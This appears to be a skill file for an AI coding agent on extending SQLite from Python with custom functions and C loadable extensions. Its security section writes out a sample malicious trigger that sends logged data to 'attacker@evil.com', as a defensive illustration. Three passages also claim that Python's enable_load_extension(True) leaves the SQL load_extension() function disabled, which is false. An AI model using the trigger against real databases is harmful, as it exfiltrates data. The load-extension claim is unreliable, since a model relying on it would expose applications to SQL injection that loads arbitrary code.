---
name: sqlite
description:
  Extend SQLite with application-defined functions and loadable extensions in
  Python. Use when you need custom SQL logic (transforms, scoring, aggregations)
  in-process, or need to load/build C extensions for reusable SQLite plugins.
  Assumes Python stdlib sqlite3. Go equivalents exist (zombiezen/go-sqlite,
  mattn/go-sqlite3) — look up their APIs at runtime.
---

# SQLite for Server Applications

Two ways to extend SQLite from a server process (examples in Python;
the same concepts apply to Go via zombiezen/go-sqlite or mattn/go-sqlite3):

1. **Application-defined functions** — register callables directly on a
   connection. No compilation, no shared libraries. Best for project-specific
   logic (scoring, transforms, custom aggregates).

2. **Loadable extensions** — compiled C shared libraries (`.so`/`.dll`/
   `.dylib`) loaded at runtime. Best for reusable plugins you want to share
   across projects or distribute to others. Extensions can register functions,
   virtual tables, collating sequences, and VFS implementations.

Both approaches run inside SQLite's query engine — your custom logic composes
with indexes, WHERE clauses, GROUP BY, and window frames.

## When to use this skill

- You need **custom transforms in SQL** — domain scoring, text normalization,
  hashing, unit conversion, custom JSON extraction
- You want **computed columns or indexes** backed by your own logic (requires
  `deterministic=True`)
- You need **custom aggregations** beyond SUM/AVG/COUNT — weighted averages,
  running medians, HyperLogLog sketches
- You want to **load third-party SQLite extensions** (spatialite, sqlite-vec,
  etc.)
- You want to **build reusable SQLite plugins** as shared libraries
- You're using **SQLite as the application database** in a server process (not
  just a throwaway script)

## When NOT to use this skill

- You need full-text search → use SQLite's built-in FTS5 extension (but the
  loading section here shows how to enable it if it's not compiled in)
- You need vector similarity → use sqlite-vec (load it as an extension per the
  loading section)
- Your database is PostgreSQL/MySQL → use native UDFs or stored procedures
  instead

---

# Part 1: Application-Defined Functions

Register Python callables that SQLite calls during query execution. No C code,
no shared libraries — just functions registered per-connection.

## Function types

| Type          | Called                                      | Returns       | Use case                       |
| ------------- | ------------------------------------------- | ------------- | ------------------------------ |
| **Scalar**    | Once per row                                | Single value  | Transforms, parsing, hashing   |
| **Aggregate** | `step()` per row, `finalize()` once         | Single value  | Custom rollups, sketches       |
| **Window**    | `step()`/`inverse()`/`value()`/`finalize()` | Value per row | Running stats, moving averages |

All three are registered per-connection — you must re-register them each time
you open a database.

## Python: stdlib `sqlite3`

### Scalar functions

```python
import sqlite3
import hashlib
import json

conn = sqlite3.connect("app.db")

# Basic scalar: normalize whitespace
def normalize_ws(text: str | None) -> str | None:
    if text is None:
        return None
    return " ".join(text.split())

conn.create_function("normalize_ws", 1, normalize_ws, deterministic=True)

# Use it in queries
conn.execute("""
    SELECT normalize_ws(name) FROM users WHERE normalize_ws(name) LIKE ?
""", ("%john doe%",))

# Scalar with multiple args: extract nested JSON key
def json_dig(blob: str | None, *keys: str) -> str | None:
    if blob is None:
        return None
    try:
        obj = json.loads(blob)
        for key in keys:
            if isinstance(obj, dict):
                obj = obj.get(key)
            elif isinstance(obj, list) and key.isdigit():
                obj = obj[int(key)]
            else:
                return None
        return json.dumps(obj) if isinstance(obj, (dict, list)) else str(obj)
    except (json.JSONDecodeError, IndexError, TypeError):
        return None

# nArg=-1 means variadic
conn.create_function("json_dig", -1, json_dig, deterministic=True)

conn.execute("SELECT json_dig(metadata, 'address', 'city') FROM users")
```

**Key parameters for `create_function`:**

| Param           | Meaning                                                                                                  |
| --------------- | -------------------------------------------------------------------------------------------------------- |
| `name`          | SQL function name (case-insensitive, max 255 bytes UTF-8)                                                |
| `narg`          | Expected argument count. -1 = variadic.                                                                  |
| `func`          | Python callable                                                                                          |
| `deterministic` | If `True`, SQLite may cache results and use the function in indexes. **Set this for any pure function.** |

### Aggregate functions

Subclass with `step()` and `finalize()` methods:

```python
class WeightedAvg:
    """Weighted average aggregate: weighted_avg(value, weight)"""

    def __init__(self):
        self.numerator = 0.0
        self.denominator = 0.0

    def step(self, value, weight):
        if value is None or weight is None:
            return
        self.numerator += value * weight
        self.denominator += weight

    def finalize(self):
        if self.denominator == 0:
            return None
        return self.numerator / self.denominator

conn.create_aggregate("weighted_avg", 2, WeightedAvg)

conn.execute("""
    SELECT category, weighted_avg(score, sample_weight)
    FROM reviews
    GROUP BY category
""")
```

SQLite guarantees `finalize()` is called exactly once if `step()` was called at
least once, even if the query is interrupted. Clean up any resources in
`finalize()`.

### Window functions (Python 3.11+)

```python
class RunningMedian:
    """Window function: running median over the window frame."""

    def __init__(self):
        self.values = []

    def step(self, value):
        if value is not None:
            self.values.append(value)

    def inverse(self, value):
        """Called when a row leaves the window frame."""
        if value is not None:
            self.values.remove(value)

    def value(self):
        """Current window value — called after each step/inverse."""
        if not self.values:
            return None
        s = sorted(self.values)
        n = len(s)
        if n % 2 == 1:
            return s[n // 2]
        return (s[n // 2 - 1] + s[n // 2]) / 2

    def finalize(self):
        return self.value()

conn.create_window_function("running_median", 1, RunningMedian)

conn.execute("""
    SELECT ts, price,
           running_median(price) OVER (
               ORDER BY ts ROWS BETWEEN 4 PRECEDING AND CURRENT ROW
           ) AS median_5
    FROM trades
""")
```

Window functions need four methods: `step`, `inverse`, `value`, `finalize`. The
`inverse` method is what makes window evaluation efficient — SQLite slides the
frame forward by adding one row (`step`) and removing one row (`inverse`),
instead of recomputing from scratch.

### Registration helper pattern

Register all your functions in one place so every connection gets them:

```python
def register_app_functions(conn: sqlite3.Connection) -> None:
    """Register all application-defined functions on a connection."""
    conn.create_function("normalize_ws", 1, normalize_ws, deterministic=True)
    conn.create_function("json_dig", -1, json_dig, deterministic=True)
    conn.create_aggregate("weighted_avg", 2, WeightedAvg)
    # ...add more here

# Use it everywhere you open a connection
conn = sqlite3.connect("app.db")
register_app_functions(conn)
```

## The `deterministic` flag

Mark a function as **deterministic** when it always returns the same output for
the same inputs. This is critical — it unlocks:

1. **Expression indexes** — `CREATE INDEX idx ON t(my_func(col))` only works
   with deterministic functions.
2. **Generated columns** —
   `col_norm TEXT GENERATED ALWAYS AS (normalize_ws(col))` requires
   deterministic.
3. **Query optimization** — SQLite may evaluate the function once and reuse the
   result when it sees the same arguments.
4. **Partial indexes** — `CREATE INDEX idx ON t(col) WHERE my_func(col) > 0`.

**Do NOT mark as deterministic if the function:**

- Reads the clock, generates random values, or depends on locale
- Calls external services or reads mutable state
- Returns different values for the same inputs across connections

A wrongly-marked deterministic function silently corrupts indexes — the index
entry won't match the recomputed value on read.

## NULL handling

SQLite passes NULL as a first-class value. Your functions must handle it
explicitly — NULL arguments should almost always produce a NULL result (SQL's
standard NULL propagation semantics).

```python
def my_func(x):
    if x is None:
        return None
    return x * 2
```

Not handling NULL correctly leads to:

- `TypeError` crashes in Python when you call methods on `None`
- Wrong query results when NULL should propagate but doesn't

## Type affinity

SQLite is dynamically typed — a column declared `INTEGER` can hold text. Your
functions receive whatever type the caller passes. Be defensive:

```python
def safe_multiply(a, b):
    if a is None or b is None:
        return None
    try:
        return float(a) * float(b)
    except (ValueError, TypeError):
        return None
```

## Common patterns

### Fuzzy text matching

```python
from difflib import SequenceMatcher

def similarity(a, b):
    if a is None or b is None:
        return None
    return SequenceMatcher(None, a.lower(), b.lower()).ratio()

conn.create_function("similarity", 2, similarity, deterministic=True)

# Find near-matches
conn.execute("""
    SELECT name, similarity(name, ?) AS score
    FROM products
    WHERE score > 0.6
    ORDER BY score DESC
    LIMIT 10
""", ("wireless headphones",))
```

### Domain scoring

```python
def lead_score(revenue, recency_days, engagement):
    if any(v is None for v in (revenue, recency_days, engagement)):
        return None
    score = 0.0
    score += min(revenue / 10000, 1.0) * 40      # revenue: up to 40 pts
    score += max(1 - recency_days / 365, 0) * 30  # recency: up to 30 pts
    score += min(engagement / 100, 1.0) * 30       # engagement: up to 30 pts
    return round(score, 2)

conn.create_function("lead_score", 3, lead_score, deterministic=True)

# Use in queries, views, even indexes
conn.execute("""
    CREATE INDEX idx_hot_leads
    ON leads(lead_score(revenue, recency_days, engagement))
    WHERE lead_score(revenue, recency_days, engagement) > 70
""")
```

### Epoch / timestamp conversion

```python
from datetime import datetime, timezone

def epoch_to_iso(epoch_secs):
    if epoch_secs is None:
        return None
    return datetime.fromtimestamp(epoch_secs, tz=timezone.utc).isoformat()

def iso_to_epoch(iso_str):
    if iso_str is None:
        return None
    return int(datetime.fromisoformat(iso_str).timestamp())

conn.create_function("epoch_to_iso", 1, epoch_to_iso, deterministic=True)
conn.create_function("iso_to_epoch", 1, iso_to_epoch, deterministic=True)
```

---

# Part 2: Loadable Extensions

Loadable extensions are compiled C shared libraries that SQLite loads at
runtime. They're the packaging mechanism for reusable SQLite plugins —
everything from spatial indexing (SpatiaLite) to vector search (sqlite-vec)
ships as a loadable extension.

From your server process, you'll mostly **load** pre-built extensions rather than
write them. But understanding how they work helps you debug loading failures,
evaluate third-party extensions, and build your own when needed.

## Loading extensions from Python

```python
import sqlite3

conn = sqlite3.connect("app.db")

# Extension loading is disabled by default — enable it first
conn.enable_load_extension(True)

# Load an extension (.so on Linux, .dylib on macOS, .dll on Windows)
# Omit the file extension — SQLite adds the platform-appropriate suffix
conn.load_extension("./spatialite")
# or with explicit entry point:
conn.load_extension("./my_extension", "sqlite3_myext_init")

# Disable loading after you're done (defense in depth)
conn.enable_load_extension(False)

# Now use the extension's functions/tables
conn.execute("SELECT InitSpatialMetaData()")
```

**Important:** `conn.enable_load_extension(True)` only enables the C API path
(`sqlite3_load_extension`). It does NOT enable the SQL function
`load_extension()` — this is deliberate to prevent SQL injection from loading
arbitrary extensions.

### Connection-init pattern with extensions

```python
def init_connection(conn: sqlite3.Connection) -> None:
    """Initialize a connection with extensions and app functions."""
    # 1. Security defaults
    conn.execute("PRAGMA trusted_schema = OFF")

    # 2. Load extensions
    conn.enable_load_extension(True)
    conn.load_extension("./sqlite_vec")
    conn.load_extension("./spatialite")
    conn.enable_load_extension(False)

    # 3. Register app-defined functions
    conn.create_function("normalize_ws", 1, normalize_ws, deterministic=True)
    conn.create_aggregate("weighted_avg", 2, WeightedAvg)
```

## Building a C extension

When you need a reusable plugin — something you'll load across multiple projects
or distribute — write it in C.

### Minimal extension template

```c
#include <sqlite3ext.h>
SQLITE_EXTENSION_INIT1

/*
 * Scalar function: double(X) returns X * 2
 */
static void doubleFunc(
    sqlite3_context *ctx,
    int argc,
    sqlite3_value **argv
) {
    if (sqlite3_value_type(argv[0]) == SQLITE_NULL) {
        sqlite3_result_null(ctx);
        return;
    }
    double val = sqlite3_value_double(argv[0]);
    sqlite3_result_double(ctx, val * 2.0);
}

/*
 * Entry point — SQLite calls this when the extension is loaded.
 * Name convention: sqlite3_<extension>_init
 */
#ifdef _WIN32
__declspec(dllexport)
#endif
int sqlite3_mydemo_init(
    sqlite3 *db,
    char **pzErrMsg,
    const sqlite3_api_routines *pApi
) {
    SQLITE_EXTENSION_INIT2(pApi);
    return sqlite3_create_function(
        db, "double", 1,
        SQLITE_UTF8 | SQLITE_DETERMINISTIC | SQLITE_INNOCUOUS,
        NULL, doubleFunc, NULL, NULL
    );
}
```

### Compilation

```bash
# Linux
gcc -g -fPIC -shared mydemo.c -o mydemo.so

# macOS
gcc -g -fPIC -dynamiclib mydemo.c -o mydemo.dylib

# Windows (MSVC)
cl mydemo.c -link -dll -out:mydemo.dll

# Windows (MinGW)
gcc -g -shared mydemo.c -o mydemo.dll
```

Key build details:

- Include `sqlite3ext.h` (NOT `sqlite3.h`) — this provides the extension API
  pointer table
- Use `-fPIC` on Linux/macOS for position-independent code
- Omit the file extension when loading — SQLite appends the platform-appropriate
  suffix automatically

### Entry point naming

SQLite auto-discovers the entry point from the filename:

1. Take the filename between the last `/` and the first `.`
2. Lowercase it, strip leading `lib` if present
3. Entry point = `sqlite3_<result>_init`

Examples:

- `./libmathfunc-4.8.so` → `sqlite3_mathfunc_init`
- `./myext.so` → `sqlite3_myext_init`
- `./path/to/demo.dll` → `sqlite3_demo_init`

If you want a different entry point name, pass it explicitly as the second
argument to `load_extension()`.

### What an extension can register

The entry point function receives a `sqlite3 *db` handle and can call any SQLite
API on it:

| Registration call                  | What it adds                         |
| ---------------------------------- | ------------------------------------ |
| `sqlite3_create_function_v2()`     | Scalar / aggregate functions         |
| `sqlite3_create_window_function()` | Window functions                     |
| `sqlite3_create_collation_v2()`    | Collating sequences                  |
| `sqlite3_create_module_v2()`       | Virtual tables                       |
| `sqlite3_vfs_register()`           | Custom VFS implementations           |
| `sqlite3_auto_extension()`         | Auto-register for future connections |

### Persistent extensions with `sqlite3_auto_extension`

By default, an extension is scoped to the connection that loaded it. To make an
extension auto-register on all future connections in the process:

```c
int sqlite3_mydemo_init(sqlite3 *db, char **pzErrMsg,
                        const sqlite3_api_routines *pApi) {
    SQLITE_EXTENSION_INIT2(pApi);

    /* Register for this connection */
    int rc = sqlite3_create_function(db, "double", 1,
        SQLITE_UTF8 | SQLITE_DETERMINISTIC, NULL, doubleFunc, NULL, NULL);
    if (rc != SQLITE_OK) return rc;

    /* Auto-register for all future connections */
    sqlite3_auto_extension((void(*)(void))sqlite3_mydemo_init);

    /* Tell SQLite to keep this extension in memory */
    return SQLITE_OK_LOAD_PERMANENTLY;
}
```

`SQLITE_OK_LOAD_PERMANENTLY` keeps the shared library loaded even after the
originating connection closes. `sqlite3_auto_extension` makes the init function
run on every new `sqlite3_open()` call in the process.

### Static linking

The same source code works for both dynamic and static linking. When compiling
into your application:

1. Add `-DSQLITE_CORE` to the build flags — this makes the
   `SQLITE_EXTENSION_INIT` macros into no-ops
2. Call the entry point directly from your application code:

```c
extern int sqlite3_mydemo_init(sqlite3*, char**, const sqlite3_api_routines*);

sqlite3 *db;
sqlite3_open("app.db", &db);
sqlite3_mydemo_init(db, NULL, NULL);  // pApi is unused with SQLITE_CORE
```

Use distinct entry point names when statically linking multiple extensions to
avoid symbol conflicts.

## Notable extensions

Extensions you're likely to load:

| Extension        | Purpose                                                  | Load name         |
| ---------------- | -------------------------------------------------------- | ----------------- |
| **sqlite-vec**   | Vector similarity search                                 | `sqlite_vec`      |
| **SpatiaLite**   | Geospatial queries (PostGIS-like)                        | `mod_spatialite`  |
| **sqlean**       | stdlib-like collection (math, text, crypto, regex)       | varies per module |
| **sqlite-lines** | Line-by-line file/text processing                        | `lines`           |
| **sqlite-http**  | HTTP requests from SQL                                   | `http`            |
| **FTS5**         | Full-text search (often compiled in, sometimes separate) | `fts5`            |
| **compress**     | zlib compress/uncompress                                 | `compress`        |

---

# Security

Security considerations that apply to both app functions and loadable
extensions.

## Trusted schemas

When SQLite opens a database file, the schema (views, triggers, generated
columns, expression indexes, CHECK constraints) is read from the file. If the
database came from an untrusted source, a malicious schema could invoke your
functions in unexpected ways.

**Example attack:** You register a `send_email(to, body)` function. An attacker
crafts a database with a trigger:
`CREATE TRIGGER t AFTER INSERT ON log BEGIN SELECT send_email('attacker@evil.com', new.data); END;`.
Every INSERT into `log` now emails data to the attacker.

**Defense: disable trusted schemas on every connection.**

```python
conn.execute("PRAGMA trusted_schema = OFF")
```

With `trusted_schema = OFF`, only functions marked `SQLITE_INNOCUOUS` can run
from schema-defined SQL. Your custom functions are excluded by default.

## DIRECTONLY and INNOCUOUS

| Flag           | Effect                                                                    | Use when                                                                |
| -------------- | ------------------------------------------------------------------------- | ----------------------------------------------------------------------- |
| **DIRECTONLY** | Cannot run from views, triggers, generated columns, expression indexes    | Side-effecting functions (send_email, write_file, HTTP calls)           |
| **INNOCUOUS**  | Explicitly allowed in schema-defined SQL even with `trusted_schema = OFF` | Pure helper functions you've audited for safety in adversarial contexts |
| _(neither)_    | Blocked by `trusted_schema = OFF`, allowed otherwise                      | Default for app functions — safe with the PRAGMA                        |

Python's `sqlite3` doesn't expose `DIRECTONLY` or `INNOCUOUS` flags directly —
rely on `PRAGMA trusted_schema = OFF` for protection. In Go, `zombiezen/go-sqlite`
exposes `DirectOnly: true` on `FunctionImpl`.

**Never mark custom functions as INNOCUOUS** unless you've audited them for
safety in adversarial schema contexts.

## Extension loading controls

Extension loading is **disabled by default** — you must explicitly enable it.
This is a security boundary:

- `conn.enable_load_extension(True)` (Python) enables the C API path only — it
  does NOT enable the `load_extension()` SQL function. An attacker with SQL
  injection cannot load arbitrary extensions.
- After loading your extensions, call `conn.enable_load_extension(False)` to
  re-lock the gate.
- To disable extension loading at compile time: `-DSQLITE_OMIT_LOAD_EXTENSION`

### Security checklist

- [ ] `PRAGMA trusted_schema = OFF` on every connection
- [ ] Extension loading disabled after loading your extensions
- [ ] Side-effecting functions protected by trusted_schema=OFF
- [ ] No function marked INNOCUOUS without a security review
- [ ] Functions handle NULL inputs gracefully (return NULL, don't crash)
- [ ] Functions don't leak memory or file handles on error paths

---

# Performance

Applies to both app functions and extension functions.

1. **No I/O** — don't read files, call APIs, or hit the network inside a
   function. Pre-compute and store the result.
2. **No allocations in hot paths** — reuse buffers where possible.
3. **Avoid regex compilation per call** — compile once, capture in closure:

```python
import re
_PATTERN = re.compile(r"\b\d{3}-\d{2}-\d{4}\b")

def contains_ssn(text):
    if text is None:
        return None
    return 1 if _PATTERN.search(text) else 0

conn.create_function("contains_ssn", 1, contains_ssn, deterministic=True)
```

4. **Deterministic functions on indexed columns** — if you're filtering by
   `WHERE my_func(col) = X` frequently, create an expression index. The function
   runs once at INSERT/UPDATE, not on every query.

---

# Pitfalls

1. **Forgetting to re-register on new connections.** Functions and extensions
   are per-connection (unless using `sqlite3_auto_extension`). Register in your
   connection pool's init hook.

2. **Marking non-deterministic functions as deterministic.** This silently
   corrupts expression indexes and generated columns. The index stores the old
   value; queries see the new value.

3. **Ignoring NULL.** If your function crashes on NULL input, every query with a
   NULL value in that column will fail.

4. **Heavy computation per row.** A function called in a
   `SELECT ... FROM million_row_table` runs a million times. Profile.

5. **Side effects in functions used by the optimizer.** SQLite may call your
   function more or fewer times than you expect. Never rely on call count.

6. **Architecture mismatch when loading extensions.** A `.so` compiled for
   x86_64 won't load on an ARM process. On macOS, you may need `-arch arm64` or
   `-arch x86_64` explicitly.

7. **Forgetting to disable extension loading.** If you leave
   `enable_load_extension(True)` active and an attacker gets SQL injection, they
   still can't call `load_extension()` from SQL (Python only enables the C API
   path), but it's defense in depth to lock it.

## Dependencies

**Python:** stdlib `sqlite3` (ships with CPython). Window functions require
Python 3.11+.

**Go:** `zombiezen.com/go/sqlite` (no CGo) or `github.com/mattn/go-sqlite3`
(CGo) — both support app functions and extension loading. Look up their APIs
at runtime.

**C extensions:** a C compiler (gcc, clang, MSVC) and `sqlite3ext.h` (shipped
with the SQLite amalgamation).
